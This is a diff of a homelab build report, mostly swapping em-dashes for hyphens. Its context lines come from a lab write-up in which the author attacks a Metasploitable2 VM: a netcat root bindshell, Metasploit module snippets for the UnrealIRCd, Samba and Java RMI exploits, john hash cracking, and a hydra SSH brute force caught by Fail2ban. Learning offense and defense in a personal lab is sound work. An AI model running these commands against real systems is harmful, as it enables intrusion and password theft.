@@ -1,6 +1,6 @@
-#  Homelab & Cybersecurity Lab — Build Report
+#  Homelab & Cybersecurity Lab - Build Report
 
-> A documentation of my homelab journey — from setting up a monitoring stack on an old laptop to performing real penetration testing exploits in a personal cybersecurity lab.
+> A documentation of my homelab journey - from setting up a monitoring stack on an old laptop to performing real penetration testing exploits in a personal cybersecurity lab.
 
 ---
 
@@ -22,7 +22,7 @@
   - [Exploits](#exploits)
   - [Password Cracking](#password-cracking)
   - [Live Attack Monitoring](#live-attack-monitoring)
-  - [Fail2ban — Automated Defense](#fail2ban--automated-defense)
+  - [Fail2ban - Automated Defense](#fail2ban--automated-defense)
 - [Key Lessons Learned](#key-lessons-learned)
 - [Architecture Overview](#architecture-overview)
 - [Next Steps](#next-steps)
@@ -33,9 +33,9 @@
 
 | Component | Specs |
 |---|---|
-| **Server** | Old laptop — Intel i5-5300U, 4 cores @ 2.3GHz, 8GB RAM, 116GB SSD |
-| **Attack Machine** | Personal laptop (Windows 11) — Kali Linux via VMware |
-| **Target Machine** | PC — Ryzen 5600X, 16GB DDR4, RX 9060 XT — Metasploitable2 via VMware |
+| **Server** | Old laptop - Intel i5-5300U, 4 cores @ 2.3GHz, 8GB RAM, 116GB SSD |
+| **Attack Machine** | Personal laptop (Windows 11) - Kali Linux via VMware |
+| **Target Machine** | PC - Ryzen 5600X, 16GB DDR4, RX 9060 XT - Metasploitable2 via VMware |
 | **OS (Server)** | Ubuntu (Linux 6.8.0) |
 | **Containerisation** | Docker + Docker Compose |
 
@@ -124,9 +124,9 @@ scrape_configs:
 **Directory:** `~/monitoring/grafana`
 
 **Dashboards imported:**
-- Node Exporter Full (ID: 1860) — system metrics
-- cAdvisor Exporter (ID: 14282) — container metrics
-- Logs / App — Loki log viewer
+- Node Exporter Full (ID: 1860) - system metrics
+- cAdvisor Exporter (ID: 14282) - container metrics
+- Logs / App - Loki log viewer
 
 **Access:** `http://<server-ip>:3000`
 
@@ -141,8 +141,8 @@ scrape_configs:
 **Directory:** `~/monitoring/loki`
 
 **Log sources configured:**
-- `/var/log/*log` — system logs (syslog, auth.log, kern.log, etc.)
-- `/var/lib/docker/containers/*/*-json.log` — all Docker container logs
+- `/var/log/*log` - system logs (syslog, auth.log, kern.log, etc.)
+- `/var/lib/docker/containers/*/*-json.log` - all Docker container logs
 
 **Architecture:**
 ```
@@ -190,7 +190,7 @@ All homelab services are now accessible remotely via the Tailscale IP:
 
 **Directory:** `~/ai`
 
-**Model used:** `phi3:mini` — lightweight, runs on CPU, fits within available RAM.
+**Model used:** `phi3:mini` - lightweight, runs on CPU, fits within available RAM.
 
 ```yaml
 services:
@@ -221,7 +221,7 @@ services:
 
 To reduce heat on the server and get faster responses, Ollama was moved to the PC (Ryzen 5600X, RX 9060 XT 16GB) and Open WebUI was updated to point to it over the network.
 
-**On Windows PC — allow network connections:**
+**On Windows PC - allow network connections:**
 ```powershell
 [System.Environment]::SetEnvironmentVariable("OLLAMA_HOST", "0.0.0.0", "Machine")
 ```
@@ -238,7 +238,7 @@ environment:
   - OLLAMA_BASE_URL=http://<pc-ip>:11434
 ```
 
-**Known issue:** RX 9060 XT is a new card — Ollama ROCm support not yet available, model runs on CPU. GPU support to be explored via LM Studio.
+**Known issue:** RX 9060 XT is a new card - Ollama ROCm support not yet available, model runs on CPU. GPU support to be explored via LM Studio.
 
 ---
 
@@ -289,9 +289,9 @@ cAdvisor → Prometheus → Grafana
               └─────────────────────┘
 ```
 
-**Network mode:** Both VMs set to Bridged — allows cross-machine communication over the home network.
+**Network mode:** Both VMs set to Bridged - allows cross-machine communication over the home network.
 
-**Target machine:** Metasploitable2 — an intentionally vulnerable Linux VM designed for penetration testing practice.
+**Target machine:** Metasploitable2 - an intentionally vulnerable Linux VM designed for penetration testing practice.
 
 ---
 
@@ -303,7 +303,7 @@ cAdvisor → Prometheus → Grafana
 nmap -sV <target-ip>
 ```
 
-**Results — open ports discovered:**
+**Results - open ports discovered:**
 
 | Port | Service | Version |
 |---|---|---|
@@ -324,9 +324,9 @@ nmap -sV <target-ip>
 
 ### Exploits
 
-#### Exploit 1 — Bindshell (Port 1524)
+#### Exploit 1 - Bindshell (Port 1524)
 
-Port 1524 had an unauthenticated root shell listening — no exploit required, just a direct netcat connection.
+Port 1524 had an unauthenticated root shell listening - no exploit required, just a direct netcat connection.
 
 ```bash
 nc <target-ip> 1524
@@ -334,13 +334,13 @@ whoami
 # root
 ```
 
-**Severity:** Critical — unauthenticated remote root access.
+**Severity:** Critical - unauthenticated remote root access.
 
 ---
 
-#### Exploit 2 — UnrealIRCd Backdoor (CVE-2010-2075)
+#### Exploit 2 - UnrealIRCd Backdoor (CVE-2010-2075)
 
-UnrealIRCd 3.2.8.1 contained a backdoor secretly inserted into its source code by an attacker in 2009 — a real-world supply chain attack.
+UnrealIRCd 3.2.8.1 contained a backdoor secretly inserted into its source code by an attacker in 2009 - a real-world supply chain attack.
 
 ```bash
 use exploit/unix/irc/unreal_ircd_3281_backdoor
@@ -356,7 +356,7 @@ run
 
 ---
 
-#### Exploit 3 — Samba Usermap Script (CVE-2007-2447)
+#### Exploit 3 - Samba Usermap Script (CVE-2007-2447)
 
 A vulnerability in Samba's MS-RPC functionality allowed unauthenticated remote command execution.
 
@@ -369,11 +369,11 @@ run
 # whoami → root
 ```
 
-**Severity:** Critical — unauthenticated remote root access via file sharing service.
+**Severity:** Critical - unauthenticated remote root access via file sharing service.
 
 ---
 
-#### Exploit 4 — Java RMI Server (Meterpreter)
+#### Exploit 4 - Java RMI Server (Meterpreter)
 
 Java RMI service exposed on port 1099 allowed code execution via a malicious RMI registry response.
 
@@ -384,7 +384,7 @@ set LHOST <attacker-ip>
 run
 ```
 
-**Result:** Meterpreter session opened — providing encrypted in-memory shell with advanced post-exploitation capabilities.
+**Result:** Meterpreter session opened - providing encrypted in-memory shell with advanced post-exploitation capabilities.
 
 ---
 
@@ -411,7 +411,7 @@ john --show hashes.txt
 | service | service | rockyou.txt |
 | root | toor | Custom wordlist |
 
-**4 out of 5 hashes cracked** using simple wordlists. All cracked passwords were the username itself or its reverse — demonstrating critically weak password policy.
+**4 out of 5 hashes cracked** using simple wordlists. All cracked passwords were the username itself or its reverse - demonstrating critically weak password policy.
 
 **Finding:** Weak password policy allows offline hash cracking in under 5 minutes.
 
@@ -433,7 +433,7 @@ hydra -l danish -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<server-ip>
 
 **What was observed:**
 
-While Hydra ran on Kali, Grafana's Live mode showed failed SSH login attempts flooding in real time — each attempt appearing as a log line with the attacker's IP, username tried, and timestamp. This simulated exactly what a SOC analyst would see during an active brute force attack.
+While Hydra ran on Kali, Grafana's Live mode showed failed SSH login attempts flooding in real time - each attempt appearing as a log line with the attacker's IP, username tried, and timestamp. This simulated exactly what a SOC analyst would see during an active brute force attack.
 
 ```
 sshd: Failed password for danish from <attacker-ip> port 54321 ssh2
@@ -443,7 +443,7 @@ sshd: Failed password for danish from <attacker-ip> port 54323 ssh2
 
 ---
 
-### Fail2ban — Automated Defense
+### Fail2ban - Automated Defense
 
 **Purpose:** Automatically ban IPs that exceed a threshold of failed SSH login attempts.
 
@@ -477,7 +477,7 @@ After running Hydra from Kali, Fail2ban detected 5 failed attempts within second
 fail2ban.actions: NOTICE  [sshd] Ban <attacker-ip>
 ```
 
-Hydra immediately lost connectivity to the server — all subsequent attempts were dropped at the firewall level.
+Hydra immediately lost connectivity to the server - all subsequent attempts were dropped at the firewall level.
 
 **Checking ban status:**
 ```bash
@@ -512,8 +512,8 @@ Grafana/Loki shows the full timeline of events
 
 **Monitoring:**
 - How metrics pipelines work: collector → storage → visualisation
-- PromQL basics — `rate()`, labels, filtering
-- LogQL basics — label filtering, string matching
+- PromQL basics - `rate()`, labels, filtering
+- LogQL basics - label filtering, string matching
 - The difference between metrics (what's happening) and logs (what happened)
 
 **Cybersecurity:**
@@ -564,4 +564,4 @@ Grafana/Loki shows the full timeline of events
 
 ---
 
-*Built and documented by Danish — a homelab and cybersecurity learning journey.*
+*Built and documented by Danish - a homelab and cybersecurity learning journey.*
